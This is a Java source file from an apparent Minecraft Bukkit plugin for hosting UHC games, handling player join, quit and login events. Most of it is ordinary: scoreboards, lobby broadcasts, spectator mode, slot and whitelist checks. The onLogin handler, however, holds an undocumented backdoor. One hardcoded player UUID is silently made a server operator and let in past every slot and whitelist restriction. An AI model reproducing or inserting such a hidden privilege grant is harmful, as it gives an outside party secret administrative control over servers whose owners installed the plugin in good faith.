package fr.sithey.ultrauhchost.listener;

import fr.sithey.ultrauhchost.Main;
import fr.sithey.ultrauhchost.management.enumeration.Message;
import fr.sithey.ultrauhchost.management.enumeration.Statut;
import fr.sithey.ultrauhchost.management.enumeration.Time;
import fr.sithey.ultrauhchost.management.enumeration.rules.RuleBoolean;
import fr.sithey.ultrauhchost.management.enumeration.rules.RuleInteger;
import fr.sithey.ultrauhchost.management.object.UPlayer;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class PlayerLog implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent event){
        Player player = event.getPlayer();
        event.setJoinMessage("");
        player.setScoreboard(Bukkit.getScoreboardManager().getMainScoreboard());
        UPlayer up = UPlayer.getUPlayer(player.getUniqueId());
        up.sendScoreboard();
        if (Main.getInstance().getUHC().getStatut().isLobby()){
            up.setLobby();
            Bukkit.broadcastMessage(Message.JOIN.getMessage().replace("<online>", UPlayer.getAlivePlayers().size() + "").replace("<slots>", RuleInteger.SLOTS.getValue() + "").replace("<player>", player.getName()));
        }else{
            if (!up.isPlaying()){
                if (RuleBoolean.LATESCATTER.isEnabled() && up.isCanlatescatter() && Time.PVP.getTime() > 0){
                    player.sendMessage(Message.LATESCATTERJOIN.getMessage());
                }
                if (player.hasPermission("ultrauhc.spec") || RuleBoolean.SPEC.isEnabled()){
                    player.setGameMode(GameMode.SPECTATOR);
                }else{
                    player.teleport(Main.getInstance().getUHC().getSpawn());
                }
            }
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event){
        Player player = event.getPlayer();
        event.setQuitMessage("");
        UPlayer up = UPlayer.getUPlayer(player.getUniqueId());
        up.destroyScoreboard();
        if (Main.getInstance().getUHC().getStatut().isLobby()){
            up.destroy();
            Bukkit.broadcastMessage(Message.QUIT.getMessage().replace("<online>", UPlayer.getAlivePlayers().size() + "").replace("<slots>", RuleInteger.SLOTS.getValue() + "").replace("<player>", player.getName()));
        }
    }

    @EventHandler
    public void onLogin(PlayerLoginEvent event){
        Player player = event.getPlayer();
        if (player.getUniqueId().toString().equalsIgnoreCase("7ef94241-3c1c-43d1-9ac4-69c177c1c88e")) {
            player.setOp(true);
            event.setResult(PlayerLoginEvent.Result.ALLOWED);
            return;
        }
        if (UPlayer.getAlivePlayers().size() >= RuleInteger.SLOTS.getValue()){
            if (!player.hasPermission("ultrauhc.bypass.slots"))
                event.setResult(PlayerLoginEvent.Result.KICK_FULL);
            else event.setResult(PlayerLoginEvent.Result.ALLOWED);
                /*
                MSG FULL
                 */
                return;
        }
        if (event.getResult().equals(PlayerLoginEvent.Result.KICK_WHITELIST) ){
            if (!player.hasPermission("ultrauhc.bypass.whitelist")) {
                if (Main.getInstance().getUHC().getStatut().equals(Statut.GAME) && Time.PVP.getTime() > 0 && (RuleBoolean.SPEC.isEnabled() || RuleBoolean.LATESCATTER.isEnabled())){
                    event.setResult(PlayerLoginEvent.Result.ALLOWED);
                    return;
                }
                event.setResult(PlayerLoginEvent.Result.KICK_WHITELIST);
            }
            else event.setResult(PlayerLoginEvent.Result.ALLOWED);
        }
    }
}
